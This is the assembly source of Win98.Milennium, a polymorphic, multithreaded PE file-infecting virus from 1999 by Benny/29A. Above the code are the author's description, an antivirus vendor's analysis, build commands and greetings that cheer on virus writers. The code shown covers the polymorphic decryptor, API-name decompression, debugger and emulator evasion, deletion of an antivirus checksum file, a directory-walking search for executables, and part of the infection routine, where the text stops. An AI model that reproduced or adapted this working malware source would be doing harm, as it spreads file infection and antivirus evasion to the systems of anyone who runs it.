;                                                     млллллм млллллм млллллм
;                                                     ллл ллл ллл ллл ллл ллл
;          Win98.Milennium                            мммллп  плллллл ллллллл
;          by Benny/29A                               лллмммм ммммллл ллл ллл
;                                                     ллллллл ллллллп ллл ллл
;                                                    
;
;
;Author's description
;=====================
;
;
;I'm very proud to introduce first multifiber virus ever. Not only this is
;also multithreaded polymorphic compressed armoured Win98 PE file infector
;with structure similar to neural nets. For those ppl, that doesn't know,
;what fiber is i can say: "There r many differences between threads and
;fibers, but this one is the most important. Threads r scheduled by
;specific Operating System's algorihtm, so its in 50% up to OS, which
;thread will run and which not. Fibers r special threads, that r scheduled
;ONLY by YOUR algorithm." I will explain all details in my tutorial.
;
;
;
;What happens on execution ?
;----------------------------
;
;Virus will:
;1)	Decrypt it's body by polymorphic decryptor
;2)	Decompress API strings
;3)	Gets module handle of KERNEL32.DLL
;4)	Gets addresses for all needed APIs
;5)	Creates Main thread
;		I)	Converts actual thread to fiber
;		II)	Creates all needed fibers
;		III)	Finds file
;		IV)	Chex file
;		V)	Infects file
;		VI)	Loops III) - V)
;		VII)	Deletes TBAV checksum file
;		VIII)	Changes directory by dot-dot method
;		IX)	Loops III) - VII)
;
;6) Chex some flags (=> payload) and jumps to host program.
;
;
;
;Main features
;--------------
;
;Platforms:	Win98+, platforms supportin' threads, fibers and "IN" instruction.
;Residency:	Nope, direct action only.
;Stealth:	No due to nonresidency.
;Antidebuggin':	Yes, uses threads, fibers and IsDebuggerPresent API.
;Antiheuristix:	Yes, uses threads, fibers and polymorphic engine.
;AntiAntiVirus:	Yes, deletes TBAV checksum file.
;Fast infection:Yes, infects all files in directory structure.
;Polymorphism:	Yes.
;Other features:a) Usin' "Memory-Mapped files".
;		b) No use of absolute addresses.
;		c) The only way, how to detect this virus is check PE header
;		   for suspicious flags (new section and flags in last section)
;		   or find decryption routine (that's not easy, it's polymorphic).
;		   It can't be detected by heuristic analyzer due to use of
;		   threads and fibers. AV scanner can't trace all APIs
;		   and can't know all of 'em. In this age. I think, this is
;		   the best antiheuristic technique.
;		d) Usin' SEH for handlin' expected and unexpected exeptions.
;		e) Infects EXE, SCR, BAK, DAT and SFX (WinRAR) files.
;		f) Two ways, how to infect file: 1) append to last section
;						 2) create new section
;		g) Similar structure to Neural Nets.
;		h) Unicode support for future versions of windozes
;
;
;
;Payload
;--------
;
;If virus is at least 50th generation of original, it displays
;in possibility 1:10 MessageBox.
;
;
;
;AVP's description
;==================
;
;This is not a dangerous parasitic Win98 direct action polymorphic virus. It
;uses several Windows APIs included only in Windows98 and WindowsNT 3.51
;Service Pack 3 or higher, and will not work under Windows95. Due to
;infection-related bugs, it also doesn't work under WinNT and Win2000. So it
;is Win98 specific virus. The infection mechanism used is a very tricky one -
;- and a very stable under Win98, too. It makes this virus a very fast
;infector, but several infection related bugs unhide the virus presence in
;non-Win98 systems. When executed, the virus searches for PE executable files
;in the current directory and all the upper directories. During infection the
;virus uses two infection ways: increases the size of last file section for
;its code, or adds a new section called ".mdata". At each 30 infected file the
;virus depending on the system timer (in one case of 10) displays the
;following message box:
;
;  +---------------------------------------------------+
;  |         Win32.Milennium by Benny/29A              |
;  +---------------------------------------------------|
;  | First multifiber virus is here, beware of me ;-)  |
;  |         Click OK if u wanna run this shit..'      |
;  +---------------------------------------------------+
;
;
;Technical details
;------------------
;
;When an infected file is executed, the polymorphic routine will decrypt the
;constant virus body. Next, the virus unpacks the API names using the
;following scheme: each API name is split in words, each word that appears
;twice is stored in a dictionary (for example SetFileAttributes and
;GetFileAttributes APIs are encoded like this:
;
;Dictionary: Set, Get, File, Attributes
;Encoding: 1, 3, 4, 2, 3, 4. 
;
;Any word that is not in the dictionary is stored "AS IS". After unpacking API
;names, it gets the addresses for all the used APIs. Then, it creates a thread
;and waits for it to finnish.
;
;
;The main thread and fibers
;---------------------------
;
;The thread converts itself to a fiber and split the infection process in 7
;pieces:
;
;Fiber 1 - gets the current directory and searches for the following file
;types: *.EXE, *.SCR, *.BAK, *.DAT, *.SFX. Then it gives control to fiber 3.
;After receiving back the control, it deletes the file (if any) ANTIVIR.DAT
;from the current directory and goes to the upper directory.
;
;Fiber 2 - checks if the code runs under a debugger and if yes, it makes the
;stack pointer zero. This will result in a debugger crash.
;
;Fiber 3 - gets a file from the current search started in Fiber 1 and calls
;Fiber 4 to continue. When Fiber4 is completed, it calls Fiber7 and waits to
;receive back the control. Then it checks for more files in the current
;directory.
;
;Fiber 4 - checks if the file size if less than 4Gb and then gives control to
;Fiber 5. After Fiber5 completes, it checks it the file is an exe file, if the
;target processor is Intel and if the file is not a DLL. Also, it pays
;attention to the Imagebase (only files with ImageBase = 400000h are infected
; - most applications are infectable from this point of view). Then it gives
;control to Fiber 6 and waits to receive it back.
;
;Fiber 5 - Opens the current file, creates a mapping object for this file to
;make infection process easier. Next, it calls Fiber6 and sleeps till it gets
;back the control.
;
;Fiber 6 - is closes the current file, restores the file time and date and, if
;needed, grows the current file to fit the virus code.
;
;Fiber 7 - it calls the main infection routine.
;
;
;File infection routine
;-----------------------
;
;When infecting a file, the virus scans its imports for one of the following
;APIs: GetModuleHandleA and GetModuleHandleW. This will be used by the virus
;to get the addresses of the APIs needed to spread. If the host file does not
;import one of the previous APIs, the virus will not infect it. Next, the
;virus adds its code - there's one chance in three to create a new section,
;called .mdata. Otherwise, it increases the size of the last section. Then it
;calls it's polymorphic engine to generate an encrypted image of the virus and
;the decryptor for it and writes generated code into the host file.
;
;
;
;Author's notes
;===============
;
;Hmmm, fine. Adrian Marinescu made excelent work. Really. I think, he didn't
;miss any important thing nor any internal detail. Gewd werk Adrian!
;Nevertheless, there is one thing, I have to note. Adrian made description of
;beta of Milennium. U can see, that payload writes Win32.Milennium instead
;Win98. That time I didn't tested it on WinNTs and I expected, it will be
;Win32 compatible. Unfortunately, I forgot, that IN is privileged opcode under
;WinNT (that's that bug, Adrian talked about). And after some other
;corrections (beta deleted ANTIVIR.DAT files instead ANTI-VIR.DAT), I started
;to call this virus Win98+ compatible. However, Adrians informators (or
;himself) probably never saw sharp version of Milennium. Hmm, maybe l8r. But
;this doesn't change anything on thing, that Adrian deeply analysed this virus
;and that he made really excelent work. I think its all.
;
;
;
;Greetz
;=======
;
;       All 29Aers..... Thank ya for all! I promise, I'll do everything
;			I can ever do for 29A.
;       LethalMnd...... U have a potential, keep workin' on yourself!
;	Yesnah.........	Find another dolly, babe :-)).
;       Adrian/GeCAD... Fuck off AV, join 29A! X-D
;
;
;
;How to build
;=============
;
;	tasm32 -ml -q -m4 mil.asm
;	tlink32 -Tpe -c -x -aa -r mil.obj,,, import32
;	pewrsec.com mil.exe
;
;
;
;For who is this dedicated ?
;============================
;
;This virus is dedicated for somebody. Hehe, surprisely. It's dedicated to all
;good VXerz (N0T lamerz !!!) with greet, next Milennium will be our.
;Don't give up !!!
;
;
;
;(c) 1999 Benny/29A.



.386p						;386+ intructions
.model flat					;flat model

include MZ.inc                                  ;include some needed files
include PE.inc
include Win32API.inc
include Useful.inc


extrn ExitProcess:PROC			;some APIs needed by first generation
extrn GetModuleHandleA:PROC
extrn GetModuleHandleW:PROC


.data
        db      ?                       ;for TLINK32 compatibility
ends

;VIRUS CODE STARTS HERE...
.code
Start:
        pushad                          ;push all regs
        @SEH_SetupFrame     ;setup SEH frame
        inc byte ptr [edx]              ;===> GP fault
        jmp Start                       ;some stuff for dumb emulators
seh_fn: @SEH_RemoveFrame                ;remove SEH frame
        popad                           ;and pop all regs
                                        ;stuff above will fuck AV-emulators

        push eax                        ;leave some space for "ret" to host 
        pushad                          ;push all regs
                                        ;POLY DECRYPTOR STARTS HERE...
						@j1:	db 3 dup (90h)
			call @j2
						@j2:	db 3 dup (90h)
@1:			pop ebp
						@j3:	db 3 dup (90h)
@2:			sub ebp, offset @j2
						@j4:	db 3 dup (90h)
		;	mov ecx, (virus_end-encrypted+3)/4
@4:			db	10111001b
			dd	(virus_end-encrypted+3)/4
						@j5:	db 3 dup (90h)
		;	lea esi, [ebp + encrypted]
			db	10001101b
@3:			db	10110101b
;				  regmod
			dd	offset encrypted
						@j6:	db 3 dup (90h)
decrypt:
		;	xor dword ptr [esi], 0
			db	10000001b
@7:			db	00110110b
key:			dd	0
						@j7:	db 3 dup (90h)
_next_:		;	add esi, 4
			db	10000011b
@8:			db	11000110b
			db	4
						@j8:	db 3 dup (90h)
		;	dec ecx
@5:			db	01001001b
						@j9:	db 3 dup (90h)
		;	test ecx, ecx
			db	10000101b
@6:		 	db	11001001b
	jne decrypt

encrypted:

nFile           =       1             ;some constants for decompress stage
nGet		=	2
nSet		=	3
nModule		=	4
nHandle		=	5
nCreate		=	6
nFind		=	7
nClose		=	8
nViewOf		=	9
nCurrentDirectoryA=	10
nFiber		=	11
nThread		=	12
nDelete		=	13
nLibrary	=	14
numof_csz	=	15				;number of 'em
        call skip_strings              

cstringz:
;module names
cszKernel32		db		'KERNEL32', 0
cszKernel32W		dw		'K','E','R','N','E','L','3','2', 0
cszUser32		db		'USER32', 0

;compressed API names
cszGetModuleHandleA	db		nGet, nModule, nHandle, 'A', 0
cszGetModuleHandleW	db		nGet, nModule, nHandle, 'W', 0

cszCreateThread		db		nCreate, nThread, 0
cszWaitForSingleObject	db		'WaitForSingleObject', 0
cszCloseHandle		db		nClose, nHandle, 0
cszConvertThreadToFiber	db		'Convert', nThread, 'To', nFiber, 0
cszCreateFiber		db		nCreate, nFiber, 0
cszSwitchToFiber	db		'SwitchTo', nFiber, 0
cszDeleteFiber		db		nDelete, nFiber, 0
cszGetVersion		db		nGet, 'Version', 0
cszFindFirstFileA	db		nFind, 'First', nFile, 'A', 0
cszFindNextFileA	db		nFind, 'Next', nFile, 'A', 0
cszFindClose		db		nFind, nClose, 0
cszCreateFileA		db		nCreate, nFile, 'A', 0
cszCreateFileMappingA	db		nCreate, nFile, 'MappingA', 0
cszMapViewOfFile	db		'Map', nViewOf, nFile, 0
cszUnmapViewOfFile	db		'Unmap', nViewOf, nFile, 0
cszSetFileAttributesA	db		nSet, nFile, 'AttributesA', 0
cszSetFilePointer	db		nSet, nFile, 'Pointer', 0
cszSetEndOfFile		db		nSet, 'EndOf', nFile, 0
cszSetFileTime		db		nSet, nFile, 'Time', 0
cszGetCurrentDirectoryA	db		nGet, nCurrentDirectoryA, 0
cszSetCurrentDirectoryA	db		nSet, nCurrentDirectoryA, 0
cszDeleteFile		db		nDelete, nFile, 'A', 0
cszLoadLibraryA		db		'Load', nLibrary, 'A', 0
cszFreeLibraryA		db		'Free', nLibrary, 0
cszIsDebuggerPresent	db		'IsDebuggerPresent', 0
			db		0ffh
szMessageBoxA		db		'MessageBoxA', 0

;strings for payload
szTitle			db		'Win98.Milennium by Benny/29A', 0

szText			db		'First multifiber virus is here, beware of me ! ;-)', 0dh
			db		'Click OK if u wanna run this shit...', 0
skip_strings:
        pop esi                         ;get relative delta offset
	mov ebp, esi
	sub ebp, offset cstringz
	lea edi, [ebp + strings]

next_ch:lodsb                           ;decompressing stage
	test al, al
	je copy_b
	cmp al, 0ffh
	je end_unpacking
	cmp al, numof_csz
	jb packed
copy_b:	stosb
	jmp next_ch
packed:	push esi
	lea esi, [ebp + string_subs]
        mov cl, 1
 	mov dl, al
        lodsb
packed2:test al, al
	je _inc_
packed3:cmp cl, dl
	jne un_pck
p_cpy:	stosb
	lodsb
	test al, al
	jne p_cpy
	pop esi
	jmp next_ch
un_pck:	lodsb
	test al, al
	jne packed3
_inc_:	inc ecx
	jmp un_pck

end_unpacking:
        stosb                          ;store 0ffh byte
        mov ecx, offset _GetModuleHandleA - 400000h    ;some params
GMHA = dword ptr $ - 4
	mov ebx, offset _GetModuleHandleW - 400000h
GMHW = dword ptr $ - 4
	lea edx, [ebp + szKernel32]
	lea esi, [ebp + szKernel32W]
        call MyGetModuleHandle                         ;pseudo-neuron
	jecxz error

        xchg ebx, ecx                                  
        lea esi, [ebp + szAPIs]                        ;params for next
	lea edi, [ebp + ddAPIs]
        call MyGetProcAddress                          ;pseudo-neuron
	jecxz error

        xor eax, eax
	lea edx, [ebp + dwThreadID]
	push edx
	push eax
	push ebp
	lea edx, [ebp + MainThread]
	push edx
	push eax
	push eax
        call [ebp + ddCreateThread]                    ;create main thread

        mov ebx, eax                                   ;wait for
        xor eax, eax                                   ;thread
        dec eax                                        ;signalization
	push eax
	push ebx
        call [ebp + ddWaitForSingleObject]             ;...

        push ebx                                       ;and close handle
        call [ebp + ddCloseHandle]                     ;of main thread

        call payload                                   ;try payload
error:  mov eax, [ebp + Entrypoint]
	add eax, 400000h
	mov [esp.cPushad], eax
	popad
        ret                                            ;and jump to host

;------------------------------------------------------------------------------- 

payload:
        cmp byte ptr [ebp + GenerationCount], 30       ;30th generation ?
        jne end_payload                                ;nope

        in al, 40h                                     
	and al, 9d
        jne end_payload                                ;chance 1:10

        lea edx, [ebp + szUser32]                      ;yup, load library
        push edx                                       ;(USER32.DLL)
	call [ebp + ddLoadLibraryA]
	xchg eax, ecx
	jecxz end_payload
	xchg ecx, ebx

        lea esi, [ebp + szMessageBoxA]                 ;get address of
        call GetProcAddress                            ;MessageBoxA API
        xchg eax, ecx                                  ;error ?
        jecxz end_payload                              ;...

        push 1000h                                     ;pass params
	lea edx, [ebp + szTitle]
	push edx
	lea edx, [ebp + szText]
	push edx
	push 0
        call ecx                                       ;call API
	push ebx
        call [ebp + ddFreeLibraryA]                    ;and unload library

end_payload:
        ret                                          

;------------------------------------------------------------------------------- 

MyGetModuleHandle       Proc            ;our GetModuleHandle function
        jecxz try_GMHW                  ;try Unicode version
	mov edi, 400000h
	push edx
_GMH_:	add ecx, edi
	call [ecx]
	xchg eax, ecx
er_GMH:	ret
try_GMHW:                               ;Unicode version
	mov ecx, ebx
	jecxz er_GMH
	push esi
	jmp _GMH_
MyGetModuleHandle	EndP

;-------------------------------------------------------------------------------
 
MyGetProcAddress        Proc            ;our GetProcAddress function
	call GetProcAddress
        test eax, eax                   ;error ?
	je er_GPA
        stosd                           ;store address
        @endsz                          ;get next API name
        cmp byte ptr [esi], 0ffh        ;end of API names ?
        jne MyGetProcAddress            ;no, next API
        ret                             ;yeah, quit
er_GPA:	xor ecx, ecx
	ret
GetProcAddress:
	pushad
	@SEH_SetupFrame 
	mov eax, ebx
	add eax, [eax.MZ_lfanew]
	mov ecx, [eax.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_Size]
	jecxz Proc_Address_not_found
	mov ebp, ebx
	add ebp, [eax.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
	push ecx
	mov edx, ebx
	add edx, [ebp.ED_AddressOfNames]
	mov ecx, [ebp.ED_NumberOfNames]
	xor eax, eax
Search_for_API_name:
	mov edi, [esp + 16]
	mov esi, ebx
	add esi, [edx + eax * 4]
Next_Char_in_API_name:
        cmpsb
	jz Matched_char_in_API_name
	inc eax
	loop Search_for_API_name
	pop eax
Proc_Address_not_found:
	xor eax, eax
	jmp end_GetProcAddress
Matched_char_in_API_name:
	cmp byte ptr [esi-1], 0
	jne Next_Char_in_API_name
	pop ecx
	mov edx, ebx
	add edx, [ebp.ED_AddressOfOrdinals]
	movzx eax, word ptr [edx + eax * 2]
Check_Index:
	cmp eax, [ebp.ED_NumberOfFunctions]
	jae Proc_Address_not_found
	mov edx, ebx
	add edx, [ebp.ED_AddressOfFunctions]
	add ebx, [edx + eax * 4]
	mov eax, ebx
	sub ebx, ebp
	cmp ebx, ecx
	jb Proc_Address_not_found
end_GetProcAddress:
	@SEH_RemoveFrame
	mov [esp.Pushad_eax], eax
	popad
	ret
MyGetProcAddress	EndP

;------------------------------------------------------------------------------- 

GetProcAddressIT proc   ;inputs:        EAX - API name
			;		ECX - lptr to MZ header
			;		EDX - module name
                        ;outputs:       EAX - RVA pointer to IAT, 0 if error
	pushad
	xor eax, eax
	push ebp
	mov esi, [ecx.MZ_lfanew]
	add esi, ecx
	mov eax, [esi.NT_OptionalHeader.OH_DirectoryEntries.DE_Import.DD_VirtualAddress]
	mov ebp, ecx
	push ecx
	movzx ecx, word ptr [esi.NT_FileHeader.FH_NumberOfSections]
	movzx ebx, word ptr [esi.NT_FileHeader.FH_SizeOfOptionalHeader]
	lea ebx, [esi.NT_OptionalHeader + ebx]
scan_sections:
	mov edx, [ebx.SH_VirtualAddress]
	cmp edx, eax
	je section_found
	sub ebx, -IMAGE_SIZEOF_SECTION_HEADER
	loop scan_sections
	pop ecx
	pop eax
	jmp End_GetProcAddressIT2
section_found:
	mov ebx, [ebx + 20]
	add ebx, ebp
	pop ecx
	pop eax
	test ebx, ebx
	je End_GetProcAddressIT2
	xor esi, esi
	xor ebp, ebp
	push esi
	dec ebp
Get_DLL_Name:
	pop esi
	inc ebp
	mov edi, [esp + 20]
	mov ecx, [ebx.esi.ID_Name]
	test ecx, ecx
	je End_GetProcAddressIT2
	sub ecx, edx
	sub esi, -IMAGE_SIZEOF_IMPORT_DESCRIPTOR
	push esi
	lea esi, [ebx + ecx]
Next_Char_from_DLL:
	lodsb
	add al, -'.'	
	jz IT_nup
	sub al, -'.' + 'a'
        cmp al, 'z' - 'a' + 1
	jae no_up
	add al, -20h
no_up:	sub al, -'a'
IT_nup:	scasb
	jne Get_DLL_Name
	cmp byte ptr [edi-1], 0
	jne Next_Char_from_DLL
Found_DLL_Name:
	pop esi	
	imul eax, ebp, IMAGE_SIZEOF_IMPORT_DESCRIPTOR
	mov ecx, [ebx + eax.ID_OriginalFirstThunk]
	jecxz End_GetProcAddressIT2
	sub ecx, edx
	add ecx, ebx
	xor esi, esi
Next_Imported_Name:
	push esi
	mov edi, [esp + 32]
	mov esi, [ecx + esi]
	test esi, esi
	je End_GetProcAddressIT3
	sub esi, edx
	add esi, ebx
	lodsw
next_char:
	cmpsb
	jne next_step
	cmp byte ptr [esi-1], 0
	je got_it
	jmp next_char
next_step:
	pop esi
	sub esi, -4
	jmp Next_Imported_Name
got_it:	pop esi
	imul ebp, IMAGE_SIZEOF_IMPORT_DESCRIPTOR
	add ebx, ebp
	mov eax, [ebx.ID_FirstThunk]
	add eax, esi
	mov [esp + 28], eax
	jmp End_GetProcAddressIT
End_GetProcAddressIT3:
	pop eax
End_GetProcAddressIT2:
n6:	xor eax, eax
	mov [esp.Pushad_eax], eax
End_GetProcAddressIT:
	popad
	ret
GetProcAddressIT EndP

;------------------------------------------------------------------------------- 
; NOTE: Dendrit = Input, Axon = output, Synapse = jump link
;------------------------------------------------------------------------------- 

MainThread      Proc PASCAL delta_param:DWORD   ;delta offset as dendrit
        pushad                                  ;store all regs
        mov ebx, delta_param                    ;store delta offset

        push 0                                  
        call [ebx + ddConvertThreadToFiber]     ;convert thread to fiber
	xchg eax, ecx
        jecxz exit_main                         ;error ?
        mov [ebx + pfMain], ecx                 ;store context

        lea esi, [ebx + Neuron_Addresses]       ;create all needed fibers
	lea edi, [ebx + Fiber_Addresses+4]
	mov ecx, num_of_neurons
init_neurons:
	lodsd
	push ecx
	push ebx
	add eax, ebx
	push eax
	push 0
        call [ebx + ddCreateFiber]              ;create fiber
	pop ecx
	test eax, eax
	je exit_main
	stosd
	loop init_neurons

	push [ebx + pfNeuron_Main]
        call [ebx + ddSwitchToFiber]            ;switch to main neuron

exit_main:
	popad
	ret
MainThread	EndP

;------------------------------------------------------------------------------- 

Neuron_Main     Proc PASCAL delta_param:DWORD   ;delta offset as dendrit
        pushad                                  ;store all regs
        mov ebx, delta_param                    ;store delta offset

	push [ebx + pfNeuron_Debugger]
        call [ebx + ddSwitchToFiber]            ;dwitch to neuron

	lea edx, [ebx + CurDir]
	push edx
	push MAX_PATH
        call [ebx + ddGetCurrentDirectoryA]     ;store current directory

        mov ecx, 20
path_walk:
	push ecx
        lea esi, [ebx + szExe]                  ;extension
	mov ecx, num_of_exts
process_dir:
	push ecx
        mov [ebx + nfindfile_name], esi         ;dendrit
        mov [ebx + nFF_synapse], offset pfNeuron_Main  ;build synapse
	push [ebx + pfNeuron_FindFile]
        call [ebx + ddSwitchToFiber]            ;infect directory
	@endsz
	pop ecx
        loop process_dir                        ;next extension

	lea esi, [ebx + dtavTBAV]
	push 0
	push esi
        call [ebx + ddSetFileAttributesA]       ;blank file attributes
	push esi
        call [ebx + ddDeleteFileA]              ;delete TBAV checksum file

	lea edx, [ebx + dotdot]
	push edx
        call [ebx + ddSetCurrentDirectoryA]     ;switch to subdirectory
	pop ecx
	loop path_walk
	
	lea edx, [ebx + CurDir]
	push edx
        call [ebx + ddSetCurrentDirectoryA]     ;switch back

	push [ebx + pfMain]
        call [ebx + ddSwitchToFiber]            ;switch back to main fiber
	popad
	ret
Neuron_Main	EndP

;------------------------------------------------------------------------------- 

Neuron_Debugger Proc PASCAL delta_param:DWORD   ;delta offset as dendrit
        pushad                                  ;store all regs
        mov ebx, delta_param                    ;store delta offset

        call [ebx + ddIsDebuggerPresent]        ;is debugger present ?
	xchg eax, ecx
        jecxz end_debugger                      ;nope, jump to end

        in al, 40h                              ;this will cause execution
        xor esp, esp                            ;"xor esp, esp" under TD32

end_debugger:
        push [ebx + pfNeuron_Main]               
        call [ebx + ddSwitchToFiber]            ;jump back to main neuron

	popad
	ret
Neuron_Debugger	EndP

;------------------------------------------------------------------------------- 

Neuron_FindFile Proc PASCAL delta_param:DWORD   ;delta offset as dendrit

n_findfile:
        pushad                                  ;save all regs
        mov ebx, delta_param                    ;store delta offset

        mov edx, 0                              ;pointer to file name
nfindfile_name = dword ptr $ - 4                ;as dendrit

        lea eax, [ebx + WFD]                    ;find first file
	push eax
	push edx
	call [ebx + ddFindFirstFileA]
	xchg eax, ecx
	jecxz end_FindFile
        mov [ebx + SearchHandle], ecx           ;save search handle

checkfile:
        mov [ebx + nCF_synapse], offset pfNeuron_FindFile   ;build synapse
        push [ebx + pfNeuron_CheckFile]       
        call [ebx + ddSwitchToFiber]            ;and switch to neuron

	xor eax, eax
	cmp al, 0
nCheckFile_OK = byte ptr $ - 1                  ;check Axon
        je find_next_file                       ;check failed ?

        mov [ebx + nIF_synapse], offset pfNeuron_FindFile   ;build synapse
        push [ebx + pfNeuron_InfectFile]        
        call [ebx + ddSwitchToFiber]            ;and switch to neuron

find_next_file:
	lea edx, [ebx + WFD]
	push edx
	push [ebx + SearchHandle]
        call [ebx + ddFindNextFileA]            ;find next file
	test eax, eax
        jne checkfile                           ;r there more files ?
	push [ebx + SearchHandle]
        call [ebx + ddFindClose]                ;nope, close search handle

end_FindFile:
        push [ebx + dwThreadID]                
nFF_synapse = dword ptr $ - 4                   ;jump to previous neuron
        call [ebx + ddSwitchToFiber]            ;(depends on synapse)

        popad
	jmp n_findfile
Neuron_FindFile EndP

;------------------------------------------------------------------------------- 

Neuron_CheckFile        Proc PASCAL delta_param:DWORD ;d-offset as dendrit

n_checkfile:
        pushad                                        ;store all regs
        mov ebx, delta_param                          ;store delta offset

	mov [ebx + nCheckFile_OK], 0
	test [ebx + WFD.WFD_dwFileAttributes], FILE_ATTRIBUTE_DIRECTORY
        jne end_checkfile                             ;discard directories
	xor edx, edx
        mov ecx, [ebx + WFD.WFD_nFileSizeHigh]
	cmp ecx, edx
        jne end_checkfile                             ;discard huge files
	add dx, 4096
        cmp [ebx + WFD.WFD_nFileSizeLow], edx
        jb end_checkfile                              ;discard small files

        mov [ebx + nopenfile_size], ecx               ;dendrit
        mov [ebx + nOF_synapse], offset pfNeuron_CheckFile  ;build synapse
	push [ebx + pfNeuron_OpenFile]
        call [ebx + ddSwitchToFiber]                  ;switch to neuron
	mov ecx, [ebx + lpFile]
        jecxz end_checkfile                           ;mapped failed ?
        mov dl, byte ptr [ecx.MZ_res2]
	test dl, dl
        jne end_check_close                  ;test "already infected" mark

	mov edx, ecx
        cmp word ptr [ecx], IMAGE_DOS_SIGNATURE       ;must be MZ
	jne end_check_close
	mov ecx, [ecx.MZ_lfanew]
	jecxz end_check_close
	mov eax, [ebx + WFD.WFD_nFileSizeLow]
	cmp eax, ecx
        jb end_check_close                         ;must point inside file
	add ecx, edx

        cmp dword ptr [ecx], IMAGE_NT_SIGNATURE    ;must be PE\0\0
	jne end_check_close
	cmp word ptr [ecx.NT_FileHeader.FH_Machine], IMAGE_FILE_MACHINE_I386
	jne end_check_close					;must be 386+
	test byte ptr [ecx.NT_FileHeader.FH_Characteristics], IMAGE_FILE_EXECUTABLE_IMAGE
	je end_check_close
        cmp [ecx.NT_OptionalHeader.OH_ImageBase], 400000h  ;must be 0x400000
	jne end_check_close
	xor eax, eax
	inc eax
        mov [ebx + nCheckFile_OK], al              ;axon

end_check_close:
	cdq
	inc edx
	inc edx
        mov [ebx + nclosefile_mode], dl            ;dendrit
	mov [ebx + nClF_synapse], offset pfNeuron_CheckFile
	push [ebx + pfNeuron_CloseFile]
        call [ebx + ddSwitchToFiber]               ;switch to neuron

end_checkfile:
	push [ebx + dwThreadID]
nCF_synapse = dword ptr $ - 4                     
        call [ebx + ddSwitchToFiber]               ;jump to previous neuron

	popad
	jmp n_checkfile
Neuron_CheckFile        EndP

;------------------------------------------------------------------------------- 

Neuron_OpenFile Proc PASCAL delta_param:DWORD      ;delta offset as dendrit

n_openfile:
        pushad                                     ;store all regs
        mov ebx, delta_param                       ;store delta offset

	lea esi, [ebx + WFD.WFD_szFileName]
	mov edi, 0
nopenfile_size = dword ptr $ - 4                   ;dendrit
	xor eax, eax
	mov [ebx + lpFile], eax

	push eax
	push eax
	push OPEN_EXISTING
	push eax
	mov al, 1
	push eax
	ror eax, 1
	mov ecx, edi
	jecxz $ + 4
	rcr eax, 1
	push eax
	push esi
        call [ebx + ddCreateFileA]                 ;open file
	inc eax
	je end_OpenFile
	dec eax
	mov [ebx + hFile], eax
	cdq

	push edx
	push edi
	push edx
	mov dl, PAGE_READONLY
	test edi, edi
	je $ + 4
	shl dl, 1
	push edx
	push 0
	push eax
        call [ebx + ddCreateFileMappingA]          ;create mappin object
	test eax, eax
	je end_OpenFile2
	mov [ebx + hMapFile], eax
	cdq

	push edi
	push edx
	push edx
	mov dl, FILE_MAP_READ
	test edi, edi
	je $ + 4
	shr dl, 1
	push edx
	push eax
        call [ebx + ddMapViewOfFile]               ;map view of file
	mov [ebx + lpFile], eax
	test eax, eax
	jne end_OpenFile

end_OpenFile3:
	inc eax
end_OpenFile2:
        mov [ebx + nclosefile_mode], al            ;axon
	mov eax, [nOF_synapse]
        mov [ebx + nClF_synapse], eax              ;dendrit
	push [ebx + pfNeuron_CloseFile]
        call [ebx + ddSwitchToFiber]               ;switch to neuron

end_OpenFile:
        push [ebx + dwThreadID]                   
nOF_synapse = dword ptr $ - 4
        call [ebx + ddSwitchToFiber]            ;switch to previous neuron
	popad
	jmp n_openfile
Neuron_OpenFile EndP

;------------------------------------------------------------------------------- 

Neuron_CloseFile        Proc PASCAL delta_param:DWORD
                                                   ;delta offset as dendrit
n_closefile:
        pushad                                     ;store all regs
        mov ebx, delta_param                       ;store delta offset

	mov esi, [ebx + hFile]
	xor edi, edi
	xor ecx, ecx
	mov cl, 0
nclosefile_mode = byte ptr $ - 1                   ;dendrit
	jecxz closefile
	cmp cl, 1
	je closemap
	cmp cl, 2
	je unmapfile
	cmp al, 3
	je next_edi
	inc edi
next_edi:
	inc edi
unmapfile:
	push [ebx + lpFile]
        call [ebx + ddUnmapViewOfFile]             ;unmap view of file
closemap:
	push [ebx + hMapFile]
        call [ebx + ddCloseHandle]                 ;close mappin object

	test edi, edi
	je closefile
	cmp edi, 1
	je set_time

	xor eax, eax
	push eax
	push eax
	push [ebx + WFD.WFD_nFileSizeLow]
	push esi
        call [ebx + ddSetFilePointer]              ;set file pointer API
        push esi                                  
        call [ebx + ddSetEndOfFile]                ;set EOF

set_time:
	lea eax, [ebx + WFD.WFD_ftLastWriteTime]
	push eax
	lea eax, [ebx + WFD.WFD_ftLastAccessTime]
	push eax
	lea eax, [ebx + WFD.WFD_ftCreationTime]
	push eax
	push esi
        call [ebx + ddSetFileTime]                 ;set back file time

closefile:
	push [ebx + hFile]
        call [ebx + ddCloseHandle]                 ;close file

	push [ebx + dwThreadID]
nClF_synapse = dword ptr $ - 4
        call [ebx + ddSwitchToFiber]               ;jump to previous neuron

	popad
	jmp n_closefile
Neuron_CloseFile	EndP

;------------------------------------------------------------------------------- 

Neuron_InfectFile	Proc PASCAL delta_param:DWORD
                                                   ;delta offset as dendrit
n_infectfile:
        pushad                                     ;store all regs
        mov ebx, delta_param                       ;store delta offset
        @SEH_SetupFrame                ;setup SEH frame

	xor esi, esi
	push esi
	lea edi, [ebx + WFD.WFD_szFileName]
	push edi
        call [ebx + ddSetFileAttributesA]          ;blank file attributes
	test eax, eax
	je end_InfectFile

	mov eax, [ebx + WFD.WFD_nFileSizeLow]
	sub eax, Start - virus_end
        mov [ebx + nopenfile_size], eax            ;dendrit
        mov [ebx + nOF_synapse], offset pfNeuron_InfectFile     ;synapse
        push [ebx + pfNeuron_OpenFile]             
        call [ebx + ddSwitchToFiber]               ;switch to neuron
	mov ecx, [ebx + lpFile]
	test ecx, ecx
	je err_InfectFile

	lea eax, [ebx + szGetModuleHandleA]
	lea edx, [ebx + szKernel32]
        call GetProcAddressIT                  ;imports GetModuleHandleA ?
	test eax, eax
	jne store

        lea eax, [ebx + szGetModuleHandleW]    ;nope, must import Unicode
        call GetProcAddressIT                  ;version of that
	test eax, eax
	je err_InfectFile
	mov [ebx + GMHW], eax
	xor eax, eax
store:	mov [ebx + GMHA], eax

	push ecx
	add ecx, [ecx.MZ_lfanew]
	mov edx, ecx
x	=	IMAGE_SIZEOF_SECTION_HEADER
	movzx esi, word ptr [edx.NT_FileHeader.FH_SizeOfOptionalHeader]
        lea esi, [edx.NT_OptionalHeader + esi]
        movzx eax, word ptr [edx.NT_FileHeader.FH_NumberOfSections]
	test eax, eax
